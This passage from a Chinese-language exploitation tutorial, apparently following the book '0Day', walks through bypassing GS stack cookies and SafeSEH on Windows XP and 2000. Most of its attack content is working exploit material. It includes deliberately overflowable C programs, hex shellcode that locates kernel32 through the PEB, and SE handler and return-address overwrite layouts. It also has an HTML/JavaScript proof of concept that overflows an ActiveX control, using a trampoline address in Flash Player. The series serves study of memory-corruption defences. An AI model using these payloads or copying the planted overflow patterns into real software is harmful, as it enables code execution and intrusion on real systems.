"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x30\x75\x6e\x67\x68\x77\x6f\x6f\x79\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x9c\xfe\x12\x00"		# "\x48\x30\x40\x00"也可以, 两份数据一样的
```

再次附加调试, 现在数据区布局如下
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x007-009.png)

经过push->pop->pop->retn, 0x0012fe9c弹给eip, 开始执行shellcode, pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x007-010.png)


## 0x008 同时替换栈和.data中的Cookie突破GS

>[分析环境]  
>系统: Windows XP Professional sp3  
>编译器: Visual Studio 2008  
>调试器: OllyDbg 1.10  

新建一个工程, 贴入以下代码
```
#include <string.h>
#include <stdlib.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90";

void test(char *s, int i, char *src)
{
	char dest[200];
	if(i<0x9995)
	{
		char *buf=s+i;
		*buf+*src;
		*(buf+1)=*(src+1);
		*(buf+2)=*(src+2);
		*(buf+3)=*(src+3);
		strcpy(dest, src);
		__asm int 3
	}
}

int main()
{
	char *str=(char *)malloc(0x10000);
	test(str,0,shellcode);
}
```

项目->属性, 选择release版本, 禁用优化

运行*.exe, OllyDbg自动附加调试
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x008-001.png)

单步跟进test函数
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x008-002.png)
可以看到程序从0x00403000取出Security Cookie, 与ebp异或后放到ebp-4

![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x008-003.png)
继续单步到这里, 程序从ebp-4取出Security Cookie, 与ebp异或后, 调用Cookie Check

![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x008-004.png)
再看看源码, test函数的if条件内可以有4 byte的任意写

再次附加调试, 断在main入口处, 可以看到返回分配堆块的地址0x00410048
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x008-005.png)

当参数i<0, if条件执行, *buf可以指向低位地址0x00403000, 0x00403000-0x00410048=-53320=0xffff2fb8
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x008-006.png)

再看看copy数据的起始栈地址0x0012fe94, 返回地址0x0012ff68, ebp=0x0012ff64
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x008-007.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x008-008.png)

```
#include <string.h>
#include <stdlib.h>

char shellcode[]=
"\x90\x90\x90\x90"		# ./data Security Cookie
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90"
"\xf4\x6f\x82\x90"		# 0x90909090 xor ebp
"\x90\x90\x90\x90"
"\x94\xfe\x12\x00";		# shellcode入口地址

void test(char *s, int i, char *src)
{
	char dest[200];
	if(i<0x9995)
	{
		char *buf=s+i;
		*buf=*src;
		*(buf+1)=*(src+1);
		*(buf+2)=*(src+2);
		*(buf+3)=*(src+3);
		strcpy(dest, src);
	}
}

int main()
{
	char *str=(char *)malloc(0x10000);
	//__asm int 3
	test(str,0xffff2fb8,shellcode);

	return 0;
}
```
将源码如上修改, 构造216 byte的shellcode, 1~4 byte填充"\x90\x90\x90\x90"写入.data, 
205~208 byte填充"\xf4\x6f\x82\x90", 213~216覆盖为shellcode的入口地址, pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x008-009.png)


## 0x009 攻击异常处理突破GS

>[分析环境]  
>系统: Windows 2000 Professional sp4  
>编译器: Visual Studio 2005  
>调试器: OllyDbg 1.10  
>说明: Windows XP sp2以后采用SafeS.E.H, 避免干扰这里用Windows 2000。

新建一个工程, 贴入以下代码
```
#include <string.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90";

void test(char *input)
{
	char buf[200];
	strcpy(buf,input);
	__asm int 3
	strcat(buf,input);
}

int main()
{
	test(shellcode);

	return 0;
}
```

项目->属性, 选择release版本, 禁用优化

运行*.exe, OllyDbg自动附加调试
![](/assets/img/exploit/2017-10-03-gsbreak-overflow-seh/0x009-001.png)

View->SEH chain, 查看最近的S.E.H结构
![](/assets/img/exploit/2017-10-03-gsbreak-overflow-seh/0x009-002.png)

定位到S.E.H Handler的栈地址0x0012ffb4
![](/assets/img/exploit/2017-10-03-gsbreak-overflow-seh/0x009-003.png)

再看看输入数据的起始栈地址0x0012fea0, 0x0012ffb4-0x0012fea0=276 byte
![](/assets/img/exploit/2017-10-03-gsbreak-overflow-seh/0x009-004.png)

组织280 byte的shellcode, 最后277~280 byte覆盖为shellcode的入口地址
```
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90"
"\xa0\xfe\x12\x00"
```

pwn~
![](/assets/img/exploit/2017-10-03-gsbreak-overflow-seh/0x009-005.png)


## 0x010 从堆中绕过SafeS.E.H

>[分析环境]  
>系统: Windows XP Professional sp3  
>编译器: Visual Studio 2008  
>调试器: OllyDbg 1.10  

新建一个工程, 贴入以下代码
```
#include <string.h>
#include <stdlib.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90";

void test(char *input)
{
	char str[200];
	strcpy(str,input);
	int zero=0;
	zero=1/zero;
}

int main()
{
	char *buf=(char *)malloc(500);
	__asm int 3
	strcpy(buf,shellcode);
	test(shellcode);

	return 0;
}
```

项目->属性, 选择release版本, 禁用优化

运行*.exe, OllyDbg自动附加调试, 调用完malloc后断下
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x010-001.png)

查看malloc返回的堆块地址, eax=0x003929d0
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x010-002.png)

直接F4跳到这里, 完成了strcpy
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x010-003.png)

内存区goto 0x003929d0, 这里是copy到堆的数据
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x010-004.png)

继续单步跟入test函数, F4跳到这里, 完成strcpy
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x010-005.png)

可以看到输入数据的起始栈地址0x0012fe8c
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x010-006.png)
定位到栈上最近的S.E.H结构, SE Handler的栈地址0x0012ffb4, 0x0012ffb4-0x0012fe8c=296 byte

利用safeS.E.H的缺陷, 即使S.E.H不可信, 对于指向堆区的Handler仍然会调用。
组织300 byte的shellcode, 覆盖掉栈上的SE Handler, 指向copy到堆块上的shellcode
```
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90"
"\xd0\x29\x39\x00";
```

注释掉int 3断点, 再编译运行, pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x010-007.png)


## 0x011 利用未启用SafeS.E.H模块绕过SafeS.E.H

>[分析环境]  
>系统: Windows XP Professional sp3  
>编译器: Visual Studio 2008 & VC 6.0
>调试器: OllyDbg 1.10  

VC 6.0新建一个dll工程, 贴入以下代码
```
#include "stdafx.h"

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    return TRUE;
}

void jump()
{
	__asm
	{
		pop eax
		pop eax
		retn
	}
}
```

如下设置好项目属性
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x011-001.png)

关闭优化
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x011-002.png)

直接拖到OD载入, 选择Plugins->SafeSEH->Scan /SafeSEH Modules(需要安装OllySSEH插件), 确认SafeS.E.H没有开启
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x011-003.png)

VS 2008新建一个工程, 帖入以下代码, 选择release版本, 禁止优化
```
#include "stdafx.h"
#include <string.h>
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90";

DWORD MyException()
{
	printf("There is an exception");
	getchar();
	return 1;
}

void test(char * input)
{
	char str[200];
	strcpy(str,input);
	int zero=0;

	__try
	{
		zero=1/zero;
	}
	__except(MyException())
	{
	}
}

int main()
{
	HINSTANCE hInst=LoadLibrary(_T("SEH_NoSafeSEH_JUMP.dll"));
	char str[200];

	__asm int 3
	test(shellcode);
	
	return 0;
}
```

运行*.exe, OllyDbg自动附加调试
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x011-004.png)

单步跟进test函数, 直接F4来到这里, 此时完成了strcpy
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x011-005.png)

0x0012fdb8是shellcode的起始栈地址
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x011-006.png)

定位到栈上最近的一个SE Handler(0x0012fe94)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x011-007.png)

在dll定位一个"pop pop retn"跳板指令地址(0x111211b6), 注意这个地址不能有两个或以上的'0'连续(如"\x06\x10"也是不行的)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x011-008.png)

按如下组织shellcode
```
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"		# 220 byte
"\x12\x10\x12\x11"		# pop eax pop eax retn
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7"		# shellcode
```

pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x011-009.png)


## 0x012 利用Adobe Flash Player ActiveX控件绕过SafeS.E.H

>[分析环境]  
>系统: Windows XP Professional sp3  
>编译器: Visual Studio 2008  
>调试器: OllyDbg 1.10  
>浏览器: Internet Explorer 7  
>控件版本: Adobe Flash ActiveX 9.0.124  
>说明: 这篇文参考自《0Day》, 因为"利用Adobe Flash Player ActiveX控件绕过SafeS.E.H"这节有一些小坑, 不注意可能会实验失败, 所以写了这篇文来一步一步越过这些坑。  

新建一个MFC ActiveX控件, 添加一个test方法
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x012-001.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x012-002.png)

在test方法实现里添加代码
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x012-003.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x012-004.png)

```
#include <string.h>
#include <windows.h>

DWORD MyException()
{
	printf("There is an exception");
	getchar();
	return 1;
}

void CVulnerAX_SEHCtrl::test(LPCTSTR str)
{
	//AFX_MANAGE_STATE(AfxGetStaticModuleState());
	// TODO: 在此添加调度处理程序代码
	printf("aaaa");//定位该函数的标记
	char dest[100];
	sprintf(dest,"%s",str);	
	int zero=0;
	__try
	{
	    zero=1/zero;
	}
	__except(MyException())
	{
	}
}
```

![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x012-005.png)
如图设置好项目属性, 选择release版本, 禁用优化, 编译链接, 最后在cmd键入"Regsvr32 /path/to/activex.ocx"注册控件

```
<html>  
<body>  
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0" width="160" height="260">
  <param name="movie" value="1.swf" />
  <param name="quality" value="high" />
  <embed src="1.swf" quality="high" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="160" height="260"></embed>
</object>
<object classid="clsid:A15FD9CA-B0AA-4F51-9D26-B045CEEB9BA5" id="test"></object>  
<script>  
var s = "\u9090";
while (s.length < 45) {
s += "\u9090";
}
test.test(s);  
</script>  
</body>  
</html>
```

新建一个txt文本, 帖入以上代码, 更名为poc.html

![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x012-006.png)
注意这里的"clsid:A15FD9CA-B0AA-4F51-9D26-B045CEEB9BA5", 在ActiveX工程里找到

双击poc.html自动调用IE浏览器打开, 选择允许ActiveX控件
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x012-007.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x012-008.png)

来到这里, 用OllyDbg附加上去
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x012-009.png)

断下后选"E"找到VulnerAX_SEH.ocx, 点进去, 在printf("aaaa")下断运行
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x012-010.png)

断下后来到call sprintf, 跟随栈地址, 再往下一步
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x012-011.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x012-012.png)

可以看到数据已经copy到栈上, 起始地址0x01dcf4e4
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x012-013.png)

View->SEH chain, 定位到最近的SE Handler 0x01dcf560, 0x01dcf560-0x01dcf4e4=124 byte
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x012-013.png)

Plugins->OllyFindAddr->Overflow return address->Find CALL/JMP [EBP+N], 选择"L", 找到0x300b2d1c这个跳板
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x012-014.png)

修改poc.html
```
var s = "\u9090";
while (s.length < 60) {
s += "\u9090";
}
s+="\u9090\u9090";
s+="\u2D1C\u300B";
```

再次打开, OD附加上去, 来到call sprintf再走一步, 现在SE Handler已经覆盖成跳板地址
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x012-015.png)

先在0x300b2d1c下断, 来到这里Shift+F9运行
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x012-016.png)

断下后跟进call, 可以看到这时回到了S.E.H结构
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x012-017.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x012-018.png)

SE Handler的跳板地址会干扰shellcode, 将shellcode整体放到下面, 用一个短跳跳过去
```
// junk(120 byte)+jmp short(2 byte)+junk(2 byte)+board(4 byte)+junk(8 byte)+payload(114 byte)
var s = "\u9090";
while (s.length < 60) {
s += "\u9090";
}
s+="\u0EEB\u9090";		# 0xEB0E->jmp +14(相对于下一条指令地址+14 byte)
s+="\u2D1C\u300B";		# 跳板
s+="\u9090\u9090\u9090\u9090";		# junk
s+="\ud231\u30b2\u8b64\u8b12\u0c52\u528b\u8b1c\u0842\u728b\u8b20\u8012\u0c7e\u7533\u89f2\u03c7\u3c78\u578b\u0178\u8bc2\u207a\uc701\ued31\u348b\u01af\u45c6\u3e81\u6146\u6174\uf275\u7e81\u4508\u6978\u7574\u8be9\u247a\uc701\u8b66\u6f2c\u7a8b\u011c\u8bc7\uaf7c\u01fc\u68c7\u2067\u0120\u7968\u7530\u686e\u7720\u6f6f\ue189\u49fe\u310b\u51c0\uff50\u90d7";
test.test(s);
```

如上组织250 byte的shellcode, OD再次附加上去, 来到call sprintf往下一步
![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x012-019.png)

F9直接运行, pwn~
![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x012-020.png)


## 0x013 利用加载模块之外的地址绕过SafeS.E.H

>[分析环境]  
>系统: Windows XP Professional sp3  
>编译器: Visual Studio 2008  
>调试器: OllyDbg 1.10  

新建一个工程, 帖入以下代码, 选择release版本, 禁止优化
```
#include "stdafx.h"
#include <string.h>
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90";

DWORD MyException()
{
	printf("There is an exception");
	getchar();
	return 1;
}

void test(char *input)
{
	char str[200];
	strcpy(str,input);
	__asm int 3
	int zero=0;
	__try
	{
		zero=1/zero;
	}
